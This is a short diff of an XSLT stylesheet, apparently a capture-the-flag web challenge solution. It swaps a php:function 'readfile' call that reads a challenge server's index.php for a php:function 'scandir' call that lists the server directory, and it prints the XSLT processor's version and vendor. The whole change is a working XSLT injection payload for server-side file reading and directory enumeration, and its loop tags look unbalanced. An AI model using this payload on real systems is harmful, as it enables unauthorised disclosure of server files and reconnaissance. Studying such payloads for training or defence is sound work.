@@ -12,8 +12,11 @@
     <span style="font-style:italic"> (<xsl:value-of select='prct'/> %)</span>
     </p>
   </div>
+<xsl:variable name="myfiles" select="php:function('scandir','./')">
+<xsl:for-each select="$myfiles">
+    <LineNumber><xsl:value-of select="."/></LineNumber>
 </xsl:for-each>
-<xsl:value-of select="php:function('readfile','/challenge/web-serveur/ch50/index.php')" />
+
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
